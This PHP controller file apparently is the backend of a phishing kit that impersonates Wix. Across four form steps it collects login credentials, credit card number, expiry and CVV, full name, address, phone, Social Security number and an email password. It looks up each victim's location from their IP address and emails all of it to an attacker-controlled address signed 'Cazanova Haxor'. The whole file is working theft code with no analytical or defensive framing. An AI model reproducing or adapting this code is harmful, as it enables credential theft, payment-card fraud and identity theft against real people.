<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Send extends CI_Controller {

	public function index()
	{
		
	}

	public function one()
	{
		$USER = $this->input->post('user');
		$PASS = $this->input->post('pass');

		$ip = getenv("REMOTE_ADDR");

		$this->session->set_userdata('USER', $USER);
		$this->session->set_userdata('PASS', $PASS);

		$_curl = curl_init('http://ip-api.com/json/'.$ip.'?fields=520191&lang=en');
		curl_setopt($_curl,CURLOPT_RETURNTRANSFER,true);
		$_result = curl_exec($_curl);
		curl_close($_curl);
		$_result=json_decode($_result);
		$country = $_result->country;
		$city = $_result->city;
		$region = $_result->regionName;
		$isp = $_result->isp;
		$lat = $_result->lat;
		$lon = $_result->lon;


		$this->session->set_userdata('country', $country);
		$this->session->set_userdata('city', $city);
		$this->session->set_userdata('region', $region);
		$this->session->set_userdata('isp', $isp);
		$this->session->set_userdata('lat', $lat);
		$this->session->set_userdata('lon', $lon);

		$msg = "
============+ LOGS +============
USER: {$USER}
PASS: {$PASS}
============= [ip] =============
IP: {$ip}
Country: {$country}
City: {$city}
Region: {$region}
ISP: {$isp}
Latitude: {$lat}
Longitude: {$lon}
================================
";

		$this->email->from('ogbomosamson1@gmail.com', 'Cazanova Haxor');
		$this->email->to(X_EMAIL);

		$this->email->subject("WIX | LOG | ".$ip." | ".$country);
		$this->email->message($msg);

		$this->email->send();
	}

// ----------------------------------------------------------------------------------





	public function two()
	{
		$HOLDER = $this->input->post('holder');
		$CCNUM = $this->input->post('ccnum');
		$EXP = $this->input->post('exp');
		$CVV = $this->input->post('cvv');


		$this->session->set_userdata('HOLDER', $HOLDER);
		$this->session->set_userdata('CCNUM', $CCNUM);
		$this->session->set_userdata('EXP', $EXP);
		$this->session->set_userdata('CVV', $CVV);

		$ip = getenv("REMOTE_ADDR");

		$USER    = $this->session->userdata('USER');
		$PASS    = $this->session->userdata('PASS');

		$country    = $this->session->userdata('country');
		$city    = $this->session->userdata('city');
		$region    = $this->session->userdata('region');
		$isp    = $this->session->userdata('isp');
		$lat    = $this->session->userdata('lat');
		$lon    = $this->session->userdata('lon');

		$msg = "
============+ LOGS +============
USER: {$USER}
PASS: {$PASS}

HOLDER: {$HOLDER}
CC NUM: {$CCNUM}
EXP: {$EXP}
CVV: {$CVV}
============= [ip] =============
IP: {$ip}
Country: {$country}
City: {$city}
Region: {$region}
ISP: {$isp}
Latitude: {$lat}
Longitude: {$lon}
================================
";

		$this->email->from('ogbomosamson1@gmail.com', 'Cazanova Haxor');
		$this->email->to(X_EMAIL);

		$this->email->subject("WIX | CC | ".$ip." | ".$country);
		$this->email->message($msg);

		$this->email->send();

	}


// ----------------------------------------------------------------------------------


	public function three()
	{

		$FULL_NAME = $this->input->post('full_name');
		$ADDRESS = $this->input->post('address');
		$CITY = $this->input->post('city');
		$STATE = $this->input->post('state');
		$ZIPCODE = $this->input->post('zipcode');
		$PHONE = $this->input->post('phone');
		$SSN = $this->input->post('ssn');

		$this->session->set_userdata('FULL_NAME', $FULL_NAME);
		$this->session->set_userdata('ADDRESS', $ADDRESS);
		$this->session->set_userdata('CITY', $CITY);
		$this->session->set_userdata('STATE', $STATE);
		$this->session->set_userdata('ZIPCODE', $ZIPCODE);
		$this->session->set_userdata('PHONE', $PHONE);
		$this->session->set_userdata('SSN', $SSN);

		$ip = getenv("REMOTE_ADDR");

		$USER    = $this->session->userdata('USER');
		$PASS    = $this->session->userdata('PASS');

		$HOLDER = $this->session->userdata('HOLDER');
		$CCNUM  = $this->session->userdata('CCNUM');
		$EXP    = $this->session->userdata('EXP');
		$CVV    = $this->session->userdata('CVV');

		$country    = $this->session->userdata('country');
		$city    = $this->session->userdata('city');
		$region    = $this->session->userdata('region');
		$isp    = $this->session->userdata('isp');
		$lat    = $this->session->userdata('lat');
		$lon    = $this->session->userdata('lon');

		$msg = "
============+ LOGS +============
USER: {$USER}
PASS: {$PASS}

HOLDER: {$HOLDER}
CC NUM: {$CCNUM}
EXP: {$EXP}
CVV: {$CVV}

FULL NAME: {$FULL_NAME}
ADDRESS: {$ADDRESS}
CITY: {$CITY}
STATE: {$STATE}
ZIPCODE: {$ZIPCODE}
PHONE: {$PHONE}
SSN: {$SSN}
============= [ip] =============
IP: {$ip}
Country: {$country}
City: {$city}
Region: {$region}
ISP: {$isp}
Latitude: {$lat}
Longitude: {$lon}
================================
";

		$this->email->from('ogbomosamson1@gmail.com', 'Cazanova Haxor');
		$this->email->to(X_EMAIL);

		$this->email->subject("WIX | FULL | ".$ip." | ".$country);
		$this->email->message($msg);

		$this->email->send();
	}

// ----------------------------------------------------------------------------------


	public function four()
	{
		$EMAIL = $this->input->post('email');
		$PASSWORD = $this->input->post('password');

		// $this->session->set_userdata('EMAIL', $EMAIL);
		// $this->session->set_userdata('PASSWORD', $PASSWORD);

		$ip = getenv("REMOTE_ADDR");

		$USER    = $this->session->userdata('USER');
		$PASS    = $this->session->userdata('PASS');

		$HOLDER = $this->session->userdata('HOLDER');
		$CCNUM  = $this->session->userdata('CCNUM');
		$EXP    = $this->session->userdata('EXP');
		$CVV    = $this->session->userdata('CVV');

		$FULL_NAME    = $this->session->userdata('FULL_NAME');
		$ADDRESS    = $this->session->userdata('ADDRESS');
		$CITY    = $this->session->userdata('CITY');
		$STATE    = $this->session->userdata('STATE');
		$ZIPCODE    = $this->session->userdata('ZIPCODE');
		$PHONE    = $this->session->userdata('PHONE');
		$SSN    = $this->session->userdata('SSN');

		$country    = $this->session->userdata('country');
		$city    = $this->session->userdata('city');
		$region    = $this->session->userdata('region');
		$isp    = $this->session->userdata('isp');
		$lat    = $this->session->userdata('lat');
		$lon    = $this->session->userdata('lon');

		$msg = "
============+ LOGS +============
USER: {$USER}
PASS: {$PASS}

HOLDER: {$HOLDER}
CC NUM: {$CCNUM}
EXP: {$EXP}
CVV: {$CVV}

FULL NAME: {$FULL_NAME}
ADDRESS: {$ADDRESS}
CITY: {$CITY}
STATE: {$STATE}
ZIPCODE: {$ZIPCODE}
PHONE: {$PHONE}
SSN: {$SSN}

EMAIL: {$EMAIL}
PASSWORD: {$PASSWORD}
============= [ip] =============
IP: {$ip}
Country: {$country}
City: {$city}
Region: {$region}
ISP: {$isp}
Latitude: {$lat}
Longitude: {$lon}
================================
";

		$this->email->from('ogbomosamson1@gmail.com', 'Cazanova Haxor');
		$this->email->to(X_EMAIL);

		$this->email->subject("WIX | FULL | ".$ip." | ".$country);
		$this->email->message($msg);

		$this->email->send();
	}


}

/* End of file Send.php */
/* Location: ./application/controllers/Send.php */